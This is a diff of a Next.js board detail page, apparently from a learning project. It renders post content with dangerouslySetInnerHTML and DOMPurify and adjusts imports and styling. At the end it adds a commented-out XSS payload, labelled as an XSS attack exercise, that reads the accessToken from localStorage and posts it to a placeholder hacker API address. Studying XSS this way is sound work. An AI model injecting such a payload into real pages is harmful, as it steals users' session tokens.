@@ -3,7 +3,7 @@ import { useRouter } from "next/router";
 import {
   IQuery,
   IQueryFetchBoardArgs,
-} from "../../../src/commons/types/generated/types";
+} from "../../../../src/commons/types/generated/types";
 import Dompurify from "dompurify";
 
 const FETCH_BOARD = gql`
@@ -28,14 +28,9 @@ export default function WebEditorDetailPage() {
 
   return (
     <div>
-      {/* <div style={{ color: "pink" }}>작성자: {data?.fetchBoard.writer}</div>
-      {process.browser && (
-        <div style={{ color: "green" }}>제목: {data?.fetchBoard.title}</div>
-      ): (<div style={{color: "green"}}/>)}
-      <div style={{ color: "purple" }}>내용: {data?.fetchBoard.contents}</div> */}
-
-      <div style={{ color: "pink" }}>작성자: {data?.fetchBoard.writer}</div>
-      <div style={{ color: "green" }}>제목: {data?.fetchBoard.title}</div>
+      <div>작성자: {data?.fetchBoard.writer}</div>
+      <div>제목: {data?.fetchBoard.title}</div>
+      {/* <div>내용: {data?.fetchBoard.contents}</div> */}
       {process.browser && (
         <div
           dangerouslySetInnerHTML={{
@@ -47,5 +42,5 @@ export default function WebEditorDetailPage() {
     </div>
   );
 }
-
+//play XSS 공격
 //<img src='#' onerror='console.log(const aaa = localStorage.getItem("accessToken")); axios.post(해커의API주소, {accessToken= aaa})'/>
